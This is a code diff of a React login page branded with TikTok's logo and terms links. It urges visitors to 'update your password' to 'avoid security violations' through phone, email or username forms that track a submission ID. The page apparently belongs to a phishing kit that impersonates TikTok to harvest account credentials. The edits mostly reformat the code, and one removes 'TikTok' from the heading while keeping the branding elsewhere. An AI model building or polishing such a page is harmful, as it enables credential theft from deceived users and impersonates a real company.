@@ -23,12 +23,19 @@ export default function LoginPage() {
       <div className="w-full max-w-[380px] space-y-6">
         <div className="text-center space-y-3">
           <TikTokLogo className="mx-auto" />
-          <h1 className="text-3xl font-bold text-foreground" data-testid="heading-login">
-            Secure Your TikTok Account
+          <h1
+            className="text-3xl font-bold text-foreground"
+            data-testid="heading-login"
+          >
+            Secure Your Account
           </h1>
           {method === "select" && (
-            <p className="text-sm text-muted-foreground" data-testid="text-description">
-              Update your password to protect your account and avoid security violations.
+            <p
+              className="text-sm text-muted-foreground"
+              data-testid="text-description"
+            >
+              Update your password to protect your account and avoid security
+              violations.
             </p>
           )}
         </div>
@@ -38,12 +45,12 @@ export default function LoginPage() {
             <>
               <Button
                 variant="outline"
-                className="w-full h-12 justify-start gap-3 text-base font-medium hover-elevate active-elevate-2"
+                className="w-full min-h-12 h-auto py-3 justify-start gap-3 text-sm sm:text-base font-medium hover-elevate active-elevate-2 whitespace-normal text-left"
                 onClick={() => setMethod("phone")}
                 data-testid="button-select-phone-email-username"
               >
-                <Smartphone className="w-5 h-5" />
-                Update password with phone / email / username
+                <Smartphone className="w-5 h-5 shrink-0" />
+                <span>Update password with phone / email / username</span>
               </Button>
             </>
           )}
@@ -60,7 +67,12 @@ export default function LoginPage() {
                 >
                   <X className="w-5 h-5" />
                 </Button>
-                <h2 className="text-xl font-semibold" data-testid="heading-login-phone">Update Your Password</h2>
+                <h2
+                  className="text-xl font-semibold"
+                  data-testid="heading-login-phone"
+                >
+                  Update Your Password
+                </h2>
               </div>
 
               <div className="flex gap-2 p-1 bg-muted rounded-md">
@@ -99,7 +111,13 @@ export default function LoginPage() {
                 </Button>
               </div>
 
-              <UnifiedLoginForm method="phone" step={step} submissionId={submissionId} setStep={setStep} setSubmissionId={setSubmissionId} />
+              <UnifiedLoginForm
+                method="phone"
+                step={step}
+                submissionId={submissionId}
+                setStep={setStep}
+                setSubmissionId={setSubmissionId}
+              />
             </div>
           )}
 
@@ -115,7 +133,12 @@ export default function LoginPage() {
                 >
                   <X className="w-5 h-5" />
                 </Button>
-                <h2 className="text-xl font-semibold" data-testid="heading-login-email">Update Your Password</h2>
+                <h2
+                  className="text-xl font-semibold"
+                  data-testid="heading-login-email"
+                >
+                  Update Your Password
+                </h2>
               </div>
 
               <div className="flex gap-2 p-1 bg-muted rounded-md">
@@ -154,7 +177,13 @@ export default function LoginPage() {
                 </Button>
               </div>
 
-              <UnifiedLoginForm method="email" step={step} submissionId={submissionId} setStep={setStep} setSubmissionId={setSubmissionId} />
+              <UnifiedLoginForm
+                method="email"
+                step={step}
+                submissionId={submissionId}
+                setStep={setStep}
+                setSubmissionId={setSubmissionId}
+              />
             </div>
           )}
 
@@ -170,7 +199,12 @@ export default function LoginPage() {
                 >
                   <X className="w-5 h-5" />
                 </Button>
-                <h2 className="text-xl font-semibold" data-testid="heading-login-username">Update Your Password</h2>
+                <h2
+                  className="text-xl font-semibold"
+                  data-testid="heading-login-username"
+                >
+                  Update Your Password
+                </h2>
               </div>
 
               <div className="flex gap-2 p-1 bg-muted rounded-md">
@@ -209,20 +243,33 @@ export default function LoginPage() {
                 </Button>
               </div>
 
-              <UnifiedLoginForm method="username" step={step} submissionId={submissionId} setStep={setStep} setSubmissionId={setSubmissionId} />
+              <UnifiedLoginForm
+                method="username"
+                step={step}
+                submissionId={submissionId}
+                setStep={setStep}
+                setSubmissionId={setSubmissionId}
+              />
             </div>
           )}
-
         </div>
 
         <div className="text-center text-xs text-muted-foreground space-y-2 pt-4 border-t border-border">
           <p data-testid="text-login-terms-notice">
             By continuing, you agree to TikTok's{" "}
-            <a href="/terms" className="hover:underline" data-testid="link-login-terms">
+            <a
+              href="/terms"
+              className="hover:underline"
+              data-testid="link-login-terms"
+            >
               Terms of Service
             </a>{" "}
             and confirm that you have read TikTok's{" "}
-            <a href="/privacy" className="hover:underline" data-testid="link-login-privacy">
+            <a
+              href="/privacy"
+              className="hover:underline"
+              data-testid="link-login-privacy"
+            >
               Privacy Policy
             </a>
             .
